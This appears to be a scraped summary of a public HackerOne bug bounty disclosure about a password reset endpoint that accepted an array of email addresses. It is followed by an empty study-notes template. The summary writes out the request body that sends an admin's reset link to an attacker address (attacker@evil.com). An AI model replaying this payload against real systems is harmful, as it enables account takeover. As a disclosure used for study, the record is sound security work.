# Ability to reset password for account

- **Report ID:** 322985
- **URL:** https://hackerone.com/reports/322985
- **Program:** upserve
- **Reporter:** exadmin
- **Severity:** Critical
- **Bounty:** —
- **CWE:** Improper Access Control - Generic
- **CVEs:** —
- **Votes:** 635
- **Fetched:** 2026-10-21 16:52 UTC
- **Source:** HackerOne public hacktivity (GraphQL)

## Summary

The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address. 

POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
with body like {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}

## Report Body

_Not fetched: HackerOne returns the full write-up only to authenticated clients._
_Read it at the URL above, or set `H1_COOKIE` and re-run after deleting this file._

## Learning Notes

- **Bug class:**
- **Root cause:**
- **What made it exploitable:**
- **How I would confirm/refute it on a target:**
- **What the agent got right / wrong:**
